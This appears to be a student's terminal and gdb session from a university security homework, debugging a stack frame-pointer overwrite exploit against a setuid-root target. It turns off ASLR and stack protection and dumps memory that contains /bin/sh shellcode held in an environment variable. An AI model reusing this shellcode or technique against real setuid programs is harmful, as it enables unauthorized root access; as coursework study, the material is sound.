 Arglist at 0xbffffdd0, args: values=0xbfffff88 "\220\220\220\220"
 Locals at 0xbffffdd0, Previous frame's sp is 0xbffffdd8
 Saved registers:
  ebp at 0xbffffdd0, eip at 0xbffffdd4
(gdb) x/64x 0xbffffdd0-128
0xbffffd50:	0xbffffd8e	0x00000001	0x000000c2	0xb7e996bb
0xbffffd60:	0xbffffd8e	0xbffffe90	0x000000e0	0x00000000
0xbffffd70:	0xb7fff000	0xb7fff918	0xbffffd90	0x08048284
0xbffffd80:	0x00000000	0xbffffe24	0xb7fbb000	0x0000ff17
0xbffffd90:	0xffffffff	0x0000002f	0xb7e15dc8	0xb7fd51b0
0xbffffda0:	0x00008000	0xb7fbb000	0xb7fb9244	0xb7e210ec
0xbffffdb0:	0x00000002	0x00000000	0xb7e37a50	0x0804855b
0xbffffdc0:	0x00000002	0xbffffe84	0xbffffe90	0x08048531
0xbffffdd0:	0xbffffddc	0x080484c0	0xbfffff88	0xbffffde8
0xbffffde0:	0x080484fb	0xbfffff88	0x00000000	0xb7e21637
0xbffffdf0:	0x00000002	0xbffffe84	0xbffffe90	0x00000000
0xbffffe00:	0x00000000	0x00000000	0xb7fbb000	0xb7fffc04
0xbffffe10:	0xb7fff000	0x00000000	0xb7fbb000	0xb7fbb000
0xbffffe20:	0x00000000	0xfc2aa0e2	0xc7faaef2	0x00000000
0xbffffe30:	0x00000000	0x00000000	0x00000002	0x080483a0
0xbffffe40:	0x00000000	0xb7ff0010	0xb7fea880	0xb7fff000
(gdb) n
10	}
(gdb) x/64x 0xbffffdd0-128
0xbffffd50:	0xbffffd8e	0xb7e80615	0xb7fe996a	0xb7e996bb
0xbffffd60:	0xbffffd8e	0xb7fff000	0x08048250	0x00000000
0xbffffd70:	0xb7fff000	0xb7fff918	0xb7e11b58	0x08048284
0xbffffd80:	0x00000000	0xb7fe97eb	0x00000000	0xb7fbb000
0xbffffd90:	0xb7fbb000	0xbffffdd0	0xb7ff0010	0xbffffe14
0xbffffda0:	0xb7f2fd80	0xbffffdc0	0xb7f2fd9d	0x00000000
0xbffffdb0:	0x080484af	0xbffffdc0	0xbfffff88	0x00000014
0xbffffdc0:	0x90909090	0x72727200	0x72727272	0x3d727272
0xbffffdd0:	0xbfffffa7	0x080484c0	0xbfffff88	0xbffffde8
0xbffffde0:	0x080484fb	0xbfffff88	0x00000000	0xb7e21637
0xbffffdf0:	0x00000002	0xbffffe84	0xbffffe90	0x00000000
0xbffffe00:	0x00000000	0x00000000	0xb7fbb000	0xb7fffc04
0xbffffe10:	0xb7fff000	0x00000000	0xb7fbb000	0xb7fbb000
0xbffffe20:	0x00000000	0xfc2aa0e2	0xc7faaef2	0x00000000
0xbffffe30:	0x00000000	0x00000000	0x00000002	0x080483a0
0xbffffe40:	0x00000000	0xb7ff0010	0xb7fea880	0xb7fff000
(gdb) n
foo (values=0x895e1feb <error: Cannot access memory at address 0x895e1feb>) at target3.c:15
15	}
(gdb) x/64x 0xbfffffa7-128
0xbfffff27:	0xffff5b00	0x00001abf	0x00000000	0x00001f00
0xbfffff37:	0xffffef00	0x00000fbf	0xffff6b00	0x000000bf
0xbfffff47:	0x00000000	0x00000000	0x00000000	0x00000000
0xbfffff57:	0x00000000	0xd5deff37	0xce81e8a0	0x8e140920
0xbfffff67:	0xa084dcd8	0x36383669	0x00000000	0x00000000
0xbfffff77:	0x00000000	0x706d742f	0x7261742f	0x33746567
0xbfffff87:	0x90909000	0x72720090	0x72727272	0x72727272
0xbfffff97:	0xffffa73d	0x687300bf	0x636c6c65	0x3d65646f
0xbfffffa7:	0xdb31c031	0x80cd17b0	0x895e1feb	0xc0310876
0xbfffffb7:	0x89074688	0x0bb00c46	0x4e8df389	0x0c568d08
0xbfffffc7:	0xdb3180cd	0xcd40d889	0xffdce880	0x622fffff
0xbfffffd7:	0x732f6e69	0x742f0068	0x742f706d	0x65677261
0xbfffffe7:	0x90003374	0x00909090	0x706d742f	0x7261742f
0xbffffff7:	0x33746567	0x00000000	Cannot access memory at address 0xc0000000
(gdb) info frame
Stack level 0, frame at 0xbfffffaf:
 eip = 0x80484c3 in foo (target3.c:15); saved eip = 0x80cd17b0
 called by frame at 0xbfffffb3
 source language c.
 Arglist at 0xbfffffa7, args: values=0x895e1feb <error: Cannot access memory at address 0x895e1feb>
 Locals at 0xbfffffa7, Previous frame's sp is 0xbfffffaf
 Saved registers:
  ebp at 0xbfffffa7, eip at 0xbfffffab
(gdb) x/x 0xbfffffab
0xbfffffab:	0x80cd17b0
(gdb) x/x $esp
0xbffffddc:	0xbffffde8
(gdb) q
A debugging session is active.

	Inferior 1 [process 3450] will be killed.

Quit anyway? (y or n) y
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit3.c -o sploit3
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploit3
Segmentation fault (core dumped)
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdb -q sploit3
Reading symbols from sploit3...done.
(gdb) break main
Breakpoint 1 at 0x804852d: file sploit3.c, line 11.
(gdb) run
Starting program: /home/student/cs5435-fa19-hw4/sploits/sploit3 

Breakpoint 1, main () at sploit3.c:11
11	{
(gdb) set follow-fork-mode child
(gdb) break execve
Breakpoint 2 at 0xb7eb97e0: file ../sysdeps/unix/syscall-template.S, line 84.
(gdb) c
Continuing.

Breakpoint 2, execve () at ../sysdeps/unix/syscall-template.S:84
84	../sysdeps/unix/syscall-template.S: No such file or directory.
(gdb) n
process 3518 is executing new program: /tmp/target3

Breakpoint 1, main (argc=2, argv=0xbffffe84) at target3.c:19
19	  if( argc != 2 )
(gdb) b 9
Breakpoint 3 at 0x80484a1: file target3.c, line 9.
(gdb) c
Continuing.

Breakpoint 3, copyFourInts (values=0xbfffff7e "\220\220\220") at target3.c:9
9	  memcpy((char*)intvalues, values, sizeof(int)*5);
(gdb) info fraem
Undefined info command: "fraem".  Try "help info".
(gdb) info frame
Stack level 0, frame at 0xbffffdd8:
 eip = 0x80484a1 in copyFourInts (target3.c:9); saved eip = 0x80484c0
 called by frame at 0xbffffde4
 source language c.
 Arglist at 0xbffffdd0, args: values=0xbfffff7e "\220\220\220"
 Locals at 0xbffffdd0, Previous frame's sp is 0xbffffdd8
 Saved registers:
  ebp at 0xbffffdd0, eip at 0xbffffdd4
(gdb) x/64x 0xbffffdd0-128
0xbffffd50:	0xbffffd8e	0x00000001	0x000000c2	0xb7e996bb
0xbffffd60:	0xbffffd8e	0xbffffe90	0x000000e0	0x00000000
0xbffffd70:	0xb7fff000	0xb7fff918	0xbffffd90	0x08048284
0xbffffd80:	0x00000000	0xbffffe24	0xb7fbb000	0x0000ff17
0xbffffd90:	0xffffffff	0x0000002f	0xb7e15dc8	0xb7fd51b0
0xbffffda0:	0x00008000	0xb7fbb000	0xb7fb9244	0xb7e210ec
0xbffffdb0:	0x00000002	0x00000000	0xb7e37a50	0x0804855b
0xbffffdc0:	0x00000002	0xbffffe84	0xbffffe90	0x08048531
0xbffffdd0:	0xbffffddc	0x080484c0	0xbfffff7e	0xbffffde8
0xbffffde0:	0x080484fb	0xbfffff7e	0x00000000	0xb7e21637
0xbffffdf0:	0x00000002	0xbffffe84	0xbffffe90	0x00000000
0xbffffe00:	0x00000000	0x00000000	0xb7fbb000	0xb7fffc04
0xbffffe10:	0xb7fff000	0x00000000	0xb7fbb000	0xb7fbb000
0xbffffe20:	0x00000000	0x74b38e09	0x4f638019	0x00000000
0xbffffe30:	0x00000000	0x00000000	0x00000002	0x080483a0
0xbffffe40:	0x00000000	0xb7ff0010	0xb7fea880	0xb7fff000
(gdb) n
10	}
(gdb) x/64x 0xbffffdd0-128
0xbffffd50:	0xbffffd8e	0xb7e80615	0xb7fe996a	0xb7e996bb
0xbffffd60:	0xbffffd8e	0xb7fff000	0x08048250	0x00000000
0xbffffd70:	0xb7fff000	0xb7fff918	0xb7e11b58	0x08048284
0xbffffd80:	0x00000000	0xb7fe97eb	0x00000000	0xb7fbb000
0xbffffd90:	0xb7fbb000	0xbffffdd0	0xb7ff0010	0xbffffe14
0xbffffda0:	0xb7f2fd80	0xbffffdc0	0xb7f2fd9d	0x00000000
0xbffffdb0:	0x080484af	0xbffffdc0	0xbfffff7e	0x00000014
0xbffffdc0:	0x00909090	0x72727272	0x72727272	0xa73d7272
0xbffffdd0:	0x00bfffff	0x080484c0	0xbfffff7e	0xbffffde8
0xbffffde0:	0x080484fb	0xbfffff7e	0x00000000	0xb7e21637
0xbffffdf0:	0x00000002	0xbffffe84	0xbffffe90	0x00000000
0xbffffe00:	0x00000000	0x00000000	0xb7fbb000	0xb7fffc04
0xbffffe10:	0xb7fff000	0x00000000	0xb7fbb000	0xb7fbb000
0xbffffe20:	0x00000000	0x74b38e09	0x4f638019	0x00000000
0xbffffe30:	0x00000000	0x00000000	0x00000002	0x080483a0
0xbffffe40:	0x00000000	0xb7ff0010	0xb7fea880	0xb7fff000
(gdb) q
A debugging session is active.

	Inferior 1 [process 3518] will be killed.

Quit anyway? (y or n) y
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit3.c -o sploit3
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdb -q sploit3
Reading symbols from sploit3...done.
(gdb) break main
Breakpoint 1 at 0x804852d: file sploit3.c, line 11.
(gdb) run
Starting program: /home/student/cs5435-fa19-hw4/sploits/sploit3 

Breakpoint 1, main () at sploit3.c:11
11	{
(gdb) set follow-fork-mode child
(gdb) break execve
Breakpoint 2 at 0xb7eb97e0: file ../sysdeps/unix/syscall-template.S, line 84.
(gdb) c
Continuing.

Breakpoint 2, execve () at ../sysdeps/unix/syscall-template.S:84
84	../sysdeps/unix/syscall-template.S: No such file or directory.
(gdb) n
process 3562 is executing new program: /tmp/target3

Breakpoint 1, main (argc=2, argv=0xbffffe74) at target3.c:19
19	  if( argc != 2 )
(gdb) b 9
Breakpoint 3 at 0x80484a1: file target3.c, line 9.
(gdb) c
Continuing.

Breakpoint 3, copyFourInts (values=0xbfffff7c "\220\220\220") at target3.c:9
9	  memcpy((char*)intvalues, values, sizeof(int)*5);
(gdb) info frame
Stack level 0, frame at 0xbffffdc8:
 eip = 0x80484a1 in copyFourInts (target3.c:9); saved eip = 0x80484c0
 called by frame at 0xbffffdd4
 source language c.
 Arglist at 0xbffffdc0, args: values=0xbfffff7c "\220\220\220"
 Locals at 0xbffffdc0, Previous frame's sp is 0xbffffdc8
 Saved registers:
  ebp at 0xbffffdc0, eip at 0xbffffdc4
(gdb) x/64x 0xbffffdc0-128
0xbffffd40:	0xbffffd7e	0x00000001	0x000000c2	0xb7e996bb
0xbffffd50:	0xbffffd7e	0xbffffe80	0x000000e0	0x00000000
0xbffffd60:	0xb7fff000	0xb7fff918	0xbffffd80	0x08048284
0xbffffd70:	0x00000000	0xbffffe14	0xb7fbb000	0x0000ff17
0xbffffd80:	0xffffffff	0x0000002f	0xb7e15dc8	0xb7fd51b0
0xbffffd90:	0x00008000	0xb7fbb000	0xb7fb9244	0xb7e210ec
0xbffffda0:	0x00000002	0x00000000	0xb7e37a50	0x0804855b
0xbffffdb0:	0x00000002	0xbffffe74	0xbffffe80	0x08048531
0xbffffdc0:	0xbffffdcc	0x080484c0	0xbfffff7c	0xbffffdd8
0xbffffdd0:	0x080484fb	0xbfffff7c	0x00000000	0xb7e21637
0xbffffde0:	0x00000002	0xbffffe74	0xbffffe80	0x00000000
0xbffffdf0:	0x00000000	0x00000000	0xb7fbb000	0xb7fffc04
0xbffffe00:	0xb7fff000	0x00000000	0xb7fbb000	0xb7fbb000
0xbffffe10:	0x00000000	0x0a63aa1e	0x31b3840e	0x00000000
0xbffffe20:	0x00000000	0x00000000	0x00000002	0x080483a0
0xbffffe30:	0x00000000	0xb7ff0010	0xb7fea880	0xb7fff000
(gdb) n
10	}
(gdb) x/64x 0xbffffdc0-128
0xbffffd40:	0xbffffd7e	0xb7e80615	0xb7fe996a	0xb7e996bb
0xbffffd50:	0xbffffd7e	0xb7fff000	0x08048250	0x00000000
0xbffffd60:	0xb7fff000	0xb7fff918	0xb7e11b58	0x08048284
0xbffffd70:	0x00000000	0xb7fe97eb	0x00000000	0xb7fbb000
0xbffffd80:	0xb7fbb000	0xbffffdc0	0xb7ff0010	0xbffffe04
0xbffffd90:	0xb7f2fd80	0xbffffdb0	0xb7f2fd9d	0x00000000
0xbffffda0:	0x080484af	0xbffffdb0	0xbfffff7c	0x00000014
0xbffffdb0:	0x00909090	0x72727272	0x72727272	0x72727272
0xbffffdc0:	0xffffa73d	0x080484c0	0xbfffff7c	0xbffffdd8
0xbffffdd0:	0x080484fb	0xbfffff7c	0x00000000	0xb7e21637
0xbffffde0:	0x00000002	0xbffffe74	0xbffffe80	0x00000000
0xbffffdf0:	0x00000000	0x00000000	0xb7fbb000	0xb7fffc04
0xbffffe00:	0xb7fff000	0x00000000	0xb7fbb000	0xb7fbb000
0xbffffe10:	0x00000000	0x0a63aa1e	0x31b3840e	0x00000000
0xbffffe20:	0x00000000	0x00000000	0x00000002	0x080483a0
0xbffffe30:	0x00000000	0xb7ff0010	0xb7fea880	0xb7fff000
(gdb) q
A debugging session is active.

	Inferior 1 [process 3562] will be killed.

Quit anyway? (y or n) y
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit3.c -o sploit3
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdb -q sploit3
Reading symbols from sploit3...done.
(gdb) break main
Breakpoint 1 at 0x804852d: file sploit3.c, line 11.
(gdb) run
Starting program: /home/student/cs5435-fa19-hw4/sploits/sploit3 

Breakpoint 1, main () at sploit3.c:11
11	{
(gdb) set follow-fork-mode child
(gdb) break execve
Breakpoint 2 at 0xb7eb97e0: file ../sysdeps/unix/syscall-template.S, line 84.
(gdb) c
Continuing.

Breakpoint 2, execve () at ../sysdeps/unix/syscall-template.S:84
84	../sysdeps/unix/syscall-template.S: No such file or directory.
(gdb) n
process 3605 is executing new program: /tmp/target3

Breakpoint 1, main (argc=2, argv=0xbffffe84) at target3.c:19
19	  if( argc != 2 )
(gdb) b 9
Breakpoint 3 at 0x80484a1: file target3.c, line 9.
(gdb) c
Continuing.

Breakpoint 3, copyFourInts (values=0xbfffff7d "\220\220\220") at target3.c:9
9	  memcpy((char*)intvalues, values, sizeof(int)*5);
(gdb) info frame
Stack level 0, frame at 0xbffffdd8:
 eip = 0x80484a1 in copyFourInts (target3.c:9); saved eip = 0x80484c0
 called by frame at 0xbffffde4
 source language c.
 Arglist at 0xbffffdd0, args: values=0xbfffff7d "\220\220\220"
 Locals at 0xbffffdd0, Previous frame's sp is 0xbffffdd8
 Saved registers:
  ebp at 0xbffffdd0, eip at 0xbffffdd4
(gdb) x/64x 0xbffffdd0-128
0xbffffd50:	0xbffffd8e	0x00000001	0x000000c2	0xb7e996bb
0xbffffd60:	0xbffffd8e	0xbffffe90	0x000000e0	0x00000000
0xbffffd70:	0xb7fff000	0xb7fff918	0xbffffd90	0x08048284
0xbffffd80:	0x00000000	0xbffffe24	0xb7fbb000	0x0000ff17
0xbffffd90:	0xffffffff	0x0000002f	0xb7e15dc8	0xb7fd51b0
0xbffffda0:	0x00008000	0xb7fbb000	0xb7fb9244	0xb7e210ec
0xbffffdb0:	0x00000002	0x00000000	0xb7e37a50	0x0804855b
0xbffffdc0:	0x00000002	0xbffffe84	0xbffffe90	0x08048531
0xbffffdd0:	0xbffffddc	0x080484c0	0xbfffff7d	0xbffffde8
0xbffffde0:	0x080484fb	0xbfffff7d	0x00000000	0xb7e21637
0xbffffdf0:	0x00000002	0xbffffe84	0xbffffe90	0x00000000
0xbffffe00:	0x00000000	0x00000000	0xb7fbb000	0xb7fffc04
0xbffffe10:	0xb7fff000	0x00000000	0xb7fbb000	0xb7fbb000
0xbffffe20:	0x00000000	0x9d94f596	0xa644fb86	0x00000000
0xbffffe30:	0x00000000	0x00000000	0x00000002	0x080483a0
0xbffffe40:	0x00000000	0xb7ff0010	0xb7fea880	0xb7fff000
(gdb) n
10	}
(gdb) x/64x 0xbffffdd0-128
0xbffffd50:	0xbffffd8e	0xb7e80615	0xb7fe996a	0xb7e996bb
0xbffffd60:	0xbffffd8e	0xb7fff000	0x08048250	0x00000000
0xbffffd70:	0xb7fff000	0xb7fff918	0xb7e11b58	0x08048284
0xbffffd80:	0x00000000	0xb7fe97eb	0x00000000	0xb7fbb000
0xbffffd90:	0xb7fbb000	0xbffffdd0	0xb7ff0010	0xbffffe14
0xbffffda0:	0xb7f2fd80	0xbffffdc0	0xb7f2fd9d	0x00000000
0xbffffdb0:	0x080484af	0xbffffdc0	0xbfffff7d	0x00000014
0xbffffdc0:	0x00909090	0x72727272	0x72727272	0x3d727272
0xbffffdd0:	0xbfffffa7	0x080484c0	0xbfffff7d	0xbffffde8
0xbffffde0:	0x080484fb	0xbfffff7d	0x00000000	0xb7e21637
0xbffffdf0:	0x00000002	0xbffffe84	0xbffffe90	0x00000000
0xbffffe00:	0x00000000	0x00000000	0xb7fbb000	0xb7fffc04
0xbffffe10:	0xb7fff000	0x00000000	0xb7fbb000	0xb7fbb000
0xbffffe20:	0x00000000	0x9d94f596	0xa644fb86	0x00000000
0xbffffe30:	0x00000000	0x00000000	0x00000002	0x080483a0
0xbffffe40:	0x00000000	0xb7ff0010	0xb7fea880	0xb7fff000
(gdb) n
foo (values=0x5e1feb80 <error: Cannot access memory at address 0x5e1feb80>) at target3.c:15
15	}
(gdb) x/64x 0xbfffffa7-128
0xbfffff27:	0xffff5b00	0x00001abf	0x00000000	0x00001f00
0xbfffff37:	0xffffef00	0x00000fbf	0xffff6b00	0x000000bf
0xbfffff47:	0x00000000	0x00000000	0x00000000	0x00000000
0xbfffff57:	0x00000000	0x7dd4ccee	0x74b1378a	0xf922ed49
0xbfffff67:	0x2fb4e4f4	0x36383669	0x6d742f00	0x61742f70
0xbfffff77:	0x74656772	0x90900033	0x72720090	0x72727272
0xbfffff87:	0x72727272	0xffa73d72	0x7300bfff	0x6c6c6568
0xbfffff97:	0x65646f63	0x9090903d	0x90909090	0xffffa790
0xbfffffa7:	0x31c031bf	0xcd17b0db	0x5e1feb80	0x31087689
0xbfffffb7:	0x074688c0	0xb00c4689	0x8df3890b	0x568d084e
0xbfffffc7:	0x3180cd0c	0x40d889db	0xdce880cd	0x2fffffff
0xbfffffd7:	0x2f6e6962	0x2f006873	0x2f706d74	0x67726174
0xbfffffe7:	0x00337465	0x00909090	0x706d742f	0x7261742f
0xbffffff7:	0x33746567	0x00000000	Cannot access memory at address 0xc0000000
(gdb) x/64x 0xbfffffa7Quit
(gdb) p/x getenv("shellcode")
$1 = 0xbfffff9c
(gdb) q
A debugging session is active.

	Inferior 1 [process 3605] will be killed.

Quit anyway? (y or n) y
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit3.c -o sploit3
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploit3
Segmentation fault (core dumped)
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdb -q sploit3
Reading symbols from sploit3...done.
(gdb) break main
Breakpoint 1 at 0x804852d: file sploit3.c, line 11.
(gdb) run
Starting program: /home/student/cs5435-fa19-hw4/sploits/sploit3 

Breakpoint 1, main () at sploit3.c:11
11	{
(gdb) set follow-fork-mode child
(gdb) break execve
Breakpoint 2 at 0xb7eb97e0: file ../sysdeps/unix/syscall-template.S, line 84.
(gdb) c
Continuing.

Breakpoint 2, execve () at ../sysdeps/unix/syscall-template.S:84
84	../sysdeps/unix/syscall-template.S: No such file or directory.
(gdb) n
process 3651 is executing new program: /tmp/target3

Breakpoint 1, main (argc=2, argv=0xbffffe84) at target3.c:19
19	  if( argc != 2 )
(gdb) b 9
Breakpoint 3 at 0x80484a1: file target3.c, line 9.
(gdb) info frame
Stack level 0, frame at 0xbffffdf0:
 eip = 0x80484c9 in main (target3.c:19); saved eip = 0xb7e21637
 source language c.
 Arglist at 0xbffffde8, args: argc=2, argv=0xbffffe84
 Locals at 0xbffffde8, Previous frame's sp is 0xbffffdf0
 Saved registers:
  ebp at 0xbffffde8, eip at 0xbffffdec
(gdb) x/64x 0xbffffde8-128
0xbffffd68:	0x000000e0	0x00000000	0xb7fff000	0xb7fff918
0xbffffd78:	0xbffffd90	0x08048284	0x00000000	0xbffffe24
0xbffffd88:	0xb7fbb000	0x0000ff17	0xffffffff	0x0000002f
0xbffffd98:	0xb7e15dc8	0xb7fd51b0	0x00008000	0xb7fbb000
0xbffffda8:	0xb7fb9244	0xb7e210ec	0x00000002	0x00000000
0xbffffdb8:	0xb7e37a50	0x0804855b	0x00000002	0xbffffe84
0xbffffdc8:	0xbffffe90	0x08048531	0xb7fbb3dc	0x08048220
0xbffffdd8:	0x08048519	0x00000000	0xb7fbb000	0xb7fbb000
0xbffffde8:	0x00000000	0xb7e21637	0x00000002	0xbffffe84
0xbffffdf8:	0xbffffe90	0x00000000	0x00000000	0x00000000
0xbffffe08:	0xb7fbb000	0xb7fffc04	0xb7fff000	0x00000000
0xbffffe18:	0xb7fbb000	0xb7fbb000	0x00000000	0xe98217f6
0xbffffe28:	0xd25219e6	0x00000000	0x00000000	0x00000000
0xbffffe38:	0x00000002	0x080483a0	0x00000000	0xb7ff0010
0xbffffe48:	0xb7fea880	0xb7fff000	0x00000002	0x080483a0
0xbffffe58:	0x00000000	0x080483c1	0x080484c6	0x00000002
(gdb) c
Continuing.

Breakpoint 3, copyFourInts (values=0xbfffff7d "\220\220\220") at target3.c:9
9	  memcpy((char*)intvalues, values, sizeof(int)*5);
(gdb) info frame
Stack level 0, frame at 0xbffffdd8:
 eip = 0x80484a1 in copyFourInts (target3.c:9); saved eip = 0x80484c0
 called by frame at 0xbffffde4
 source language c.
 Arglist at 0xbffffdd0, args: values=0xbfffff7d "\220\220\220"
 Locals at 0xbffffdd0, Previous frame's sp is 0xbffffdd8
 Saved registers:
  ebp at 0xbffffdd0, eip at 0xbffffdd4
(gdb) x/64x 0xbffffdd0-128
0xbffffd50:	0xbffffd8e	0x00000001	0x000000c2	0xb7e996bb
0xbffffd60:	0xbffffd8e	0xbffffe90	0x000000e0	0x00000000
0xbffffd70:	0xb7fff000	0xb7fff918	0xbffffd90	0x08048284
0xbffffd80:	0x00000000	0xbffffe24	0xb7fbb000	0x0000ff17
0xbffffd90:	0xffffffff	0x0000002f	0xb7e15dc8	0xb7fd51b0
0xbffffda0:	0x00008000	0xb7fbb000	0xb7fb9244	0xb7e210ec
0xbffffdb0:	0x00000002	0x00000000	0xb7e37a50	0x0804855b
0xbffffdc0:	0x00000002	0xbffffe84	0xbffffe90	0x08048531
0xbffffdd0:	0xbffffddc	0x080484c0	0xbfffff7d	0xbffffde8
0xbffffde0:	0x080484fb	0xbfffff7d	0x00000000	0xb7e21637
0xbffffdf0:	0x00000002	0xbffffe84	0xbffffe90	0x00000000
0xbffffe00:	0x00000000	0x00000000	0xb7fbb000	0xb7fffc04
0xbffffe10:	0xb7fff000	0x00000000	0xb7fbb000	0xb7fbb000
0xbffffe20:	0x00000000	0xe98217f6	0xd25219e6	0x00000000
0xbffffe30:	0x00000000	0x00000000	0x00000002	0x080483a0
0xbffffe40:	0x00000000	0xb7ff0010	0xb7fea880	0xb7fff000
(gdb) n
10	}
(gdb) x/64x 0xbffffdd0-128
0xbffffd50:	0xbffffd8e	0xb7e80615	0xb7fe996a	0xb7e996bb
0xbffffd60:	0xbffffd8e	0xb7fff000	0x08048250	0x00000000
0xbffffd70:	0xb7fff000	0xb7fff918	0xb7e11b58	0x08048284
0xbffffd80:	0x00000000	0xb7fe97eb	0x00000000	0xb7fbb000
0xbffffd90:	0xb7fbb000	0xbffffdd0	0xb7ff0010	0xbffffe14
0xbffffda0:	0xb7f2fd80	0xbffffdc0	0xb7f2fd9d	0x00000000
0xbffffdb0:	0x080484af	0xbffffdc0	0xbfffff7d	0x00000014
0xbffffdc0:	0x00909090	0x72727272	0x72727272	0x3d727272
0xbffffdd0:	0xbfffff9c	0x080484c0	0xbfffff7d	0xbffffde8
0xbffffde0:	0x080484fb	0xbfffff7d	0x00000000	0xb7e21637
0xbffffdf0:	0x00000002	0xbffffe84	0xbffffe90	0x00000000
0xbffffe00:	0x00000000	0x00000000	0xb7fbb000	0xb7fffc04
0xbffffe10:	0xb7fff000	0x00000000	0xb7fbb000	0xb7fbb000
0xbffffe20:	0x00000000	0xe98217f6	0xd25219e6	0x00000000
0xbffffe30:	0x00000000	0x00000000	0x00000002	0x080483a0
0xbffffe40:	0x00000000	0xb7ff0010	0xb7fea880	0xb7fff000
(gdb) n
foo (
    values=0xbfffffa7 "\277\061\300\061۰\027̀\353\037^\211v\b1\300\210F\a\211F\f\260\v\211\363\215N\b\215V\f̀1ۉ\330@̀\350\334\377\377\377/bin/sh") at target3.c:15
15	}
(gdb) n
0x90909090 in ?? ()
(gdb) n
Cannot find bounds of current function
(gdb) n
Cannot find bounds of current function
(gdb) Connection to localhost closed by remote host.
Connection to localhost closed.
adam@Adams-MacBook-Pro hw4 % ssh -p 2224 student@localhost
student@localhost's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-70-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

94 packages can be updated.
0 updates are security updates.

New release '18.04.3 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Last login: Fri Nov 29 18:04:40 2019 from 10.0.2.2
student@5435-hw4-vm:~$ ls
cs5435-fa19-hw4  Desktop    Downloads         Music     Public     Videos
demo             Documents  examples.desktop  Pictures  Templates
student@5435-hw4-vm:~$ cd cs5435-fa19-hw4/targets/
student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ sudo sysctl -w kernel.randomize_va_space=0
[sudo] password for student: 
kernel.randomize_va_space = 0
student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ sudo make
gcc -ggdb -mpreferred-stack-boundary=2 -zexecstack -fno-stack-protector -o target0 target0.c
gcc -ggdb -mpreferred-stack-boundary=2 -zexecstack -fno-stack-protector -o target1 target1.c
gcc -ggdb -mpreferred-stack-boundary=2 -zexecstack -fno-stack-protector -o target2 target2.c
gcc -ggdb -mpreferred-stack-boundary=2 -zexecstack -fno-stack-protector -o target3 target3.c
gcc -ggdb -mpreferred-stack-boundary=2 -fno-stack-protector -o target4 target4.c
install -o root -t /tmp target0 target1 target2 target3 target4
chmod 4755 /tmp/target*
student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ cd ../sploits
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ls
shellcode.h  sploit0.c  sploit1.c  sploit2.c  sploit3.c  sploitEC.c
sploit0      sploit1    sploit2    sploit3    sploit4.c
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdb -q sploit3
Reading symbols from sploit3...done.
(gdb) break main
Breakpoint 1 at 0x804852d: file sploit3.c, line 11.
(gdb) run
Starting program: /home/student/cs5435-fa19-hw4/sploits/sploit3 

Breakpoint 1, main () at sploit3.c:11
11	{
(gdb) set follow-fork-mode child
(gdb) break execve
Breakpoint 2 at 0xb7eb97e0: file ../sysdeps/unix/syscall-template.S, line 84.
(gdb) c
Continuing.

Breakpoint 2, execve () at ../sysdeps/unix/syscall-template.S:84
84	../sysdeps/unix/syscall-template.S: No such file or directory.
(gdb) n
process 1276 is executing new program: /tmp/target3

Breakpoint 1, main (argc=2, argv=0xbffffe84) at target3.c:19
19	  if( argc != 2 )
(gdb) b 9
Breakpoint 3 at 0x80484a1: file target3.c, line 9.
(gdb) c
Continuing.

Breakpoint 3, copyFourInts (values=0xbfffff7d "\220\220\220") at target3.c:9
9	  memcpy((char*)intvalues, values, sizeof(int)*5);
(gdb) info frame
Stack level 0, frame at 0xbffffdd8:
 eip = 0x80484a1 in copyFourInts (target3.c:9); saved eip = 0x80484c0
 called by frame at 0xbffffde4
 source language c.
 Arglist at 0xbffffdd0, args: values=0xbfffff7d "\220\220\220"
 Locals at 0xbffffdd0, Previous frame's sp is 0xbffffdd8
 Saved registers:
  ebp at 0xbffffdd0, eip at 0xbffffdd4
(gdb) x/4x $esp
0xbffffdc0:	0x00000002	0xbffffe84	0xbffffe90	0x08048531
(gdb) x/4x $esp-4
0xbffffdbc:	0x0804855b	0x00000002	0xbffffe84	0xbffffe90
(gdb) x/16x $esp-32
0xbffffda0:	0x00008000	0xb7fbb000	0xb7fb9244	0xb7e210ec
0xbffffdb0:	0x00000002	0x00000000	0xb7e37a50	0x0804855b
0xbffffdc0:	0x00000002	0xbffffe84	0xbffffe90	0x08048531
0xbffffdd0:	0xbffffddc	0x080484c0	0xbfffff7d	0xbffffde8
(gdb) x/x $esp
0xbffffdc0:	0x00000002
(gdb) x/x 0xbffffdd4
0xbffffdd4:	0x080484c0
(gdb) n
10	}
(gdb) x/16x $esp-32
0xbffffda0:	0xb7f2fd80	0xbffffdc0	0xb7f2fd9d	0x00000000
0xbffffdb0:	0x080484af	0xbffffdc0	0xbfffff7d	0x00000014
0xbffffdc0:	0x00909090	0x72727272	0x72727272	0x3d727272
0xbffffdd0:	0xbfffff9c	0x080484c0	0xbfffff7d	0xbffffde8
(gdb) x/32x $esp-32
0xbffffda0:	0xb7f2fd80	0xbffffdc0	0xb7f2fd9d	0x00000000
0xbffffdb0:	0x080484af	0xbffffdc0	0xbfffff7d	0x00000014
0xbffffdc0:	0x00909090	0x72727272	0x72727272	0x3d727272
0xbffffdd0:	0xbfffff9c	0x080484c0	0xbfffff7d	0xbffffde8
0xbffffde0:	0x080484fb	0xbfffff7d	0x00000000	0xb7e21637
0xbffffdf0:	0x00000002	0xbffffe84	0xbffffe90	0x00000000
